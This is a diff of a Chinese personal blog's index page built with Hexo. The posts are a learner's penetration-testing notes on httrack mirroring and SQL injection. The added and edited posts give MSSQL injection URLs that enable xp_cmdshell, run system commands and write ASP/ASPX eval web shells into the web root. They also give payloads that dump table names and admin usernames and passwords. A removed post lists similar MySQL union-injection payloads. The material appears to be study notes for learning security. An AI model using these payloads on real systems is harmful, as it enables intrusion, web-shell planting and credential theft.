@@ -77,6 +77,97 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-kali1st" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/03/15/kali1st/" class="article-date">
+  <time class="dt-published" datetime="2024-03-15T11:35:01.000Z" itemprop="datePublished">2024-03-15</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2024/03/15/kali1st/">kali渗透测试学习第一天——信息收集</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p><strong>httrack工具制作网页镜像</strong><br>一.建立存储文件夹<br>二.命令窗口输入httrack，下一行输入项目名称<br>三.输入目标网站URL，决定网站处理方式，是否使用代理，下载的文件类型<br>四.镜像，启动！（Y&#x2F;n）</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/03/15/kali1st/" data-id="cltsm55fq0000focaa30s50q7" data-title="kali渗透测试学习第一天——信息收集" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/kali%E5%B7%A5%E5%85%B7/" rel="tag">kali工具</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-sql10thday" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/12/06/sql10thday/" class="article-date">
+  <time class="dt-published" datetime="2023-12-06T07:45:00.000Z" itemprop="datePublished">2023-12-06</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/12/06/sql10thday/">web入门SQL注入第十天</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p><strong>主题：sqlserver执行系统命令</strong><br>在SQLSERVER中是可以执行多行操作的<br>两条SQL语句是用分号隔开<br>select * from art; select * from admin</p>
+<p>xp_cmdshell默认在mssql2000中是开启的，在mssql2005之后的版本中则默认禁止。<br>如果用户拥有管理员sa权限则可以用sp_configure 重新开启它。<br>;EXEC sp_configure ‘show advanced options’, 1;RECONFIGURE;EXEC sp_configure ‘xp_cmdshell’, 1;RECONFIGURE;</p>
+<p>命令解释<br>EXEC sp_configure ‘show advanced opt- ions’,1&#x2F;&#x2F;允许修改高级参数<br>RECONFIGURE;EXEC sp_configure ‘xp_cmdshell’,1  &#x2F;&#x2F;打开xp_cmdshell扩展RECONFIGURE</p>
+<p>执行系统命令<br>EXEC master.dbo.xp_cmdshell ‘ipconfig’</p>
+<p>开始xp_cmdshell<br><a target="_blank" rel="noopener" href="http://www.demo1.com/index.aspx?id=1;EXEC">http://www.demo1.com/index.aspx?id=1;EXEC</a> sp_configure ‘show advanced options’, 1;RECONFIGURE;EXEC sp_configure ‘xp_cmdshell’, 1;RECONFIGURE;</p>
+<p>getshell </p>
+<p><a target="_blank" rel="noopener" href="http://www.demo1.com/index.aspx?id=1;exec">http://www.demo1.com/index.aspx?id=1;exec</a> master..xp_cmdshell ‘echo ^&lt;%eval request(chr(35))%^&gt; &gt; C:\inetpub\wwwroot\<a target="_blank" rel="noopener" href="http://www.demo1.com/2.asp">www.demo1.com\2.asp</a>‘ –  </p>
+<p>exec master..xp_cmdshell ‘echo ^&lt;%eval request(chr(35))%^&gt; &gt; C:\inetpub\wwwroot\<a target="_blank" rel="noopener" href="http://www.demo1.com/2.asp'--">www.demo1.com\2.asp&#39;--</a><br>exec master..xp_cmdshell ‘echo ^&lt;%@ Page Language&#x3D;”Jscript”%^&gt;^&lt;%eval(Request.Item[“chopper”],”unsafe”);%^&gt;&gt;D:\2.aspx’ –<br><a target="_blank" rel="noopener" href="http://www.demo1.com/index.aspx?id=1;exec">http://www.demo1.com/index.aspx?id=1;exec</a> master..xp_cmdshell ‘echo ^&lt;%@ Page Language&#x3D;”Jscript”%^&gt;^&lt;%eval(Request.Item[“chopper”],”unsafe”);%^&gt;&gt;C:\inetpub\wwwroot\<a target="_blank" rel="noopener" href="http://www.demo1.com/2.aspx">www.demo1.com\2.aspx</a>‘ –</p>
+<p>执行系统命令 把命令结果输出到指定文件<br><a target="_blank" rel="noopener" href="http://www.demo1.com/index.aspx?id=1;EXEC">http://www.demo1.com/index.aspx?id=1;EXEC</a> master.dbo.xp_cmdshell ‘ipconfig &gt;&gt;C:\inetpub\wwwroot\<a target="_blank" rel="noopener" href="http://www.demo1.com/ip.txt">www.demo1.com\ip.txt</a>‘</p>
+<p><a target="_blank" rel="noopener" href="http://www.demo1.com/index.aspx?id=1;EXEC">http://www.demo1.com/index.aspx?id=1;EXEC</a> master.dbo.xp_cmdshell ‘whoami &gt;&gt;C:\inetpub\wwwroot\<a target="_blank" rel="noopener" href="http://www.demo1.com/ip.txt">www.demo1.com\ip.txt</a>‘</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/12/06/sql10thday/" data-id="cltsm55fu0001foca5mp569oo" data-title="web入门SQL注入第十天" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-sql9stday" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2023/12/01/sql9stday/" class="article-date">
@@ -99,7 +190,11 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <p><strong>主题:sqlserver快速爆表、爆列、爆数据</strong><br>一、</p>
+        <p><strong>主题:sqlserver快速爆表、爆列、爆数据</strong><br>在SQL_SERVER 中 每个数据库中都有 视图-&gt;系统视图<br>在这个下面都有很多关于这个库的表，表里面存放了很多关于这个库的信息。<br>COLUMNS  列<br>TABLES 表</p>
+<p>1、查询当前用户<br><a target="_blank" rel="noopener" href="http://www.demo1.com/index.aspx?id=1">http://www.demo1.com/index.aspx?id=1</a> and user_name()&gt;1</p>
+<p>2、根据当前用户爆出所有表<br><a target="_blank" rel="noopener" href="http://www.demo1.com/index.aspx?id=1">http://www.demo1.com/index.aspx?id=1</a> and(select TABLE_NAME  from  information_schema.TABLES   where TABLE_SCHEMA&#x3D;’dbo’ FOR XML PATH)&gt;1</p>
+<p>3、爆出所有的列<br><a target="_blank" rel="noopener" href="http://www.demo1.com/index.aspx?id=1">http://www.demo1.com/index.aspx?id=1</a> and(select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME&#x3D;’admin’ FOR XML PATH)&gt;1</p>
+<p>4、爆出数据<br><a target="_blank" rel="noopener" href="http://www.demo1.com/index.aspx?id=1">http://www.demo1.com/index.aspx?id=1</a> and  ( select username,password from admin FOR XML PATH)&gt;1</p>
 
       
     </div>
@@ -179,7 +274,7 @@
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2023/12/01/sql7stday/">web入门SQL注入第六天</a>
+      <a class="p-name article-title" href="/2023/12/01/sql7stday/">web入门SQL注入第七天</a>
     </h1>
   
 
@@ -198,7 +293,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2023/12/01/sql7stday/" data-id="clpml2im9000fuocadawbh8yp" data-title="web入门SQL注入第六天" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2023/12/01/sql7stday/" data-id="clpml2im9000fuocadawbh8yp" data-title="web入门SQL注入第七天" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -447,100 +542,6 @@
 
 
   
-    <article id="post-sql1stday" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2023/11/15/sql1stday/" class="article-date">
-  <time class="dt-published" datetime="2023-11-15T14:33:05.000Z" itemprop="datePublished">2023-11-15</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2023/11/15/sql1stday/">web入门SQL注入第一天</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>一、三类（数据类型）SQL注入<br>1.int 整型<br>select *from user where id&#x3D;1<br>2.string 字符型<br>select *from user where username&#x3D;’admin’<br>3.like 搜索型<br>select *from news where title like ‘%标题%’</p>
-<p>二、注入方法<br>1.联合查询注入<br>2.报错注入<br>3.盲注入<br> a.布尔型注入<br> b.时间型注入</p>
-<p>三、常用语句<br>1.version()  查询MySQL版本<br>2.user（） 查询数据库用户名<br>3.database（） 查询数据库名<br>4.@@datadir 查询数据库路径<br>5.@@version_compile_os 查询操作系统版本<br>6.user() 用户名 system_user() 系统用户名 current_user() 当前用户名 session_user()连接数据库的用户名<br>7.@@basedir MYSQL 安装路径<br>四、注释<br>1.#<br>2.–空格<br>3.&#x2F;**&#x2F;</p>
-<p>五、判断是否存在注入</p>
-<ol>
-<li>and 1&#x3D;1 正常 或为&amp;&amp; 1&#x3D;1                   (%26%261&#x3D;1)<br>and 1&#x3D;2  错误（包括转码后 %26%261&#x3D;2)</li>
-<li>or 1&#x3D;1  或为||1&#x3D;1<br>or 1&#x3D;2</li>
-</ol>
-<p>六、判断列数<br>order by<br>eg:order by 3</p>
-<p>七、联合查询<br>union select 查询两个表的内容<br>eg:网址?id&#x3D;1 and 1&#x3D;2 union select 1,2,3  (2和3可替换为查询语句）（union前为假）</p>
-<p>八、查询库名<br>把数字替换为database()</p>
-<p>九、查询表名<br>mysql中库information_schema中存有很多信息<br>eg:<a target="_blank" rel="noopener" href="http://target_sys.com/article.php?id=-1">http://target_sys.com/article.php?id=-1</a> union select 1,2,TABLE_NAME from information_schema.TABLE_SCHEMA&#x3D;database() limilt 0,1   (database()与target_sys相同，target_sys可转为16进制0x   ) (把0改为1获取第二个表名，以此类推，直至返回空）</p>
-<p>十、查询字段<br>也查information_schema<br>eg:<a target="_blank" rel="noopener" href="http://target_sys.com/article.php?id=-1">http://target_sys.com/article.php?id=-1</a> union select 1,2,COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME&#x3D;0x61646d696e limit 0,1<br>     (admin转16进制)</p>
-<p>十一、查询数据<br>group_concat()用于打印拼接字符串，输出两个字段的内容<br>eg:<a target="_blank" rel="noopener" href="http://target_sys.com/article.php?id=-1">http://target_sys.com/article.php?id=-1</a> union select 1,2，group_concat(username,0x3a,password)from admin   （0x3a是;)H</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2023/11/15/sql1stday/" data-id="clpml2im30001uoca7py7foxq" data-title="web入门SQL注入第一天" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-newpapername" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2023/11/08/newpapername/" class="article-date">
-  <time class="dt-published" datetime="2023-11-08T12:41:53.000Z" itemprop="datePublished">2023-11-08</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2023/11/08/newpapername/">web入门第一天</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2023/11/08/newpapername/" data-id="clpml2im60004uoca5bxkeih6" data-title="web入门第一天" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%8A%E6%97%A5%E5%86%85%E5%AE%B9-%E4%BA%86%E8%A7%A3%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%B7%A5%E5%85%B7%EF%BC%8C%E4%BA%86%E8%A7%A3%E4%BA%86SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%8CXSS%E6%BC%8F%E6%B4%9E%EF%BC%8CCSRF%E6%BC%8F%E6%B4%9E%EF%BC%88%E8%BF%98%E6%B2%A1%E5%AE%9E%E8%B7%B5-%E9%97%AE%E9%A2%98-%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%EF%BC%8CPHP-windows10%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%85%8D%E7%BD%AE-kali%E6%B1%89%E5%8C%96%E5%8F%8A%E6%98%BE%E7%A4%BA%E8%B0%83%E6%95%B4/" rel="tag">今日内容 了解信息收集及相关工具，了解了SQL注入漏洞，XSS漏洞，CSRF漏洞（还没实践)问题 工具使用，PHP windows10虚拟机配置 kali汉化及显示调整</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -559,7 +560,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tags</h3>
     <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BB%8A%E6%97%A5%E5%86%85%E5%AE%B9-%E4%BA%86%E8%A7%A3%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%B7%A5%E5%85%B7%EF%BC%8C%E4%BA%86%E8%A7%A3%E4%BA%86SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%8CXSS%E6%BC%8F%E6%B4%9E%EF%BC%8CCSRF%E6%BC%8F%E6%B4%9E%EF%BC%88%E8%BF%98%E6%B2%A1%E5%AE%9E%E8%B7%B5-%E9%97%AE%E9%A2%98-%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%EF%BC%8CPHP-windows10%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%85%8D%E7%BD%AE-kali%E6%B1%89%E5%8C%96%E5%8F%8A%E6%98%BE%E7%A4%BA%E8%B0%83%E6%95%B4/" rel="tag">今日内容 了解信息收集及相关工具，了解了SQL注入漏洞，XSS漏洞，CSRF漏洞（还没实践)问题 工具使用，PHP windows10虚拟机配置 kali汉化及显示调整</a></li></ul>
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kali%E5%B7%A5%E5%85%B7/" rel="tag">kali工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BB%8A%E6%97%A5%E5%86%85%E5%AE%B9-%E4%BA%86%E8%A7%A3%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%B7%A5%E5%85%B7%EF%BC%8C%E4%BA%86%E8%A7%A3%E4%BA%86SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%8CXSS%E6%BC%8F%E6%B4%9E%EF%BC%8CCSRF%E6%BC%8F%E6%B4%9E%EF%BC%88%E8%BF%98%E6%B2%A1%E5%AE%9E%E8%B7%B5-%E9%97%AE%E9%A2%98-%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%EF%BC%8CPHP-windows10%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%85%8D%E7%BD%AE-kali%E6%B1%89%E5%8C%96%E5%8F%8A%E6%98%BE%E7%A4%BA%E8%B0%83%E6%95%B4/" rel="tag">今日内容 了解信息收集及相关工具，了解了SQL注入漏洞，XSS漏洞，CSRF漏洞（还没实践)问题 工具使用，PHP windows10虚拟机配置 kali汉化及显示调整</a></li></ul>
     </div>
   </div>
 
@@ -569,7 +570,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 20px;">SQL注入</a> <a href="/tags/%E4%BB%8A%E6%97%A5%E5%86%85%E5%AE%B9-%E4%BA%86%E8%A7%A3%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%B7%A5%E5%85%B7%EF%BC%8C%E4%BA%86%E8%A7%A3%E4%BA%86SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%8CXSS%E6%BC%8F%E6%B4%9E%EF%BC%8CCSRF%E6%BC%8F%E6%B4%9E%EF%BC%88%E8%BF%98%E6%B2%A1%E5%AE%9E%E8%B7%B5-%E9%97%AE%E9%A2%98-%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%EF%BC%8CPHP-windows10%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%85%8D%E7%BD%AE-kali%E6%B1%89%E5%8C%96%E5%8F%8A%E6%98%BE%E7%A4%BA%E8%B0%83%E6%95%B4/" style="font-size: 10px;">今日内容 了解信息收集及相关工具，了解了SQL注入漏洞，XSS漏洞，CSRF漏洞（还没实践)问题 工具使用，PHP windows10虚拟机配置 kali汉化及显示调整</a>
+      <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 20px;">SQL注入</a> <a href="/tags/kali%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">kali工具</a> <a href="/tags/%E4%BB%8A%E6%97%A5%E5%86%85%E5%AE%B9-%E4%BA%86%E8%A7%A3%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%B7%A5%E5%85%B7%EF%BC%8C%E4%BA%86%E8%A7%A3%E4%BA%86SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%8CXSS%E6%BC%8F%E6%B4%9E%EF%BC%8CCSRF%E6%BC%8F%E6%B4%9E%EF%BC%88%E8%BF%98%E6%B2%A1%E5%AE%9E%E8%B7%B5-%E9%97%AE%E9%A2%98-%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%EF%BC%8CPHP-windows10%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%85%8D%E7%BD%AE-kali%E6%B1%89%E5%8C%96%E5%8F%8A%E6%98%BE%E7%A4%BA%E8%B0%83%E6%95%B4/" style="font-size: 10px;">今日内容 了解信息收集及相关工具，了解了SQL注入漏洞，XSS漏洞，CSRF漏洞（还没实践)问题 工具使用，PHP windows10虚拟机配置 kali汉化及显示调整</a>
     </div>
   </div>
 
@@ -578,7 +579,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">December 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/03/">March 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">December 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li></ul>
     </div>
   </div>
 
@@ -591,6 +592,14 @@
       <ul>
         
           <li>
+            <a href="/2024/03/15/kali1st/">kali渗透测试学习第一天——信息收集</a>
+          </li>
+        
+          <li>
+            <a href="/2023/12/06/sql10thday/">web入门SQL注入第十天</a>
+          </li>
+        
+          <li>
             <a href="/2023/12/01/sql9stday/">web入门SQL注入第九天</a>
           </li>
         
@@ -599,15 +608,7 @@
           </li>
         
           <li>
-            <a href="/2023/12/01/sql7stday/">web入门SQL注入第六天</a>
-          </li>
-        
-          <li>
-            <a href="/2023/12/01/sql6stday/">web入门SQL注入第六天</a>
-          </li>
-        
-          <li>
-            <a href="/2023/11/30/sql5stday/">web入门SQL注入第五天</a>
+            <a href="/2023/12/01/sql7stday/">web入门SQL注入第七天</a>
           </li>
         
       </ul>
@@ -623,7 +624,7 @@
   <div class="outer">
     <div id="footer-info" class="inner">
       
-      &copy; 2023 一只麟<br>
+      &copy; 2024 一只麟<br>
       Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
     </div>
   </div>
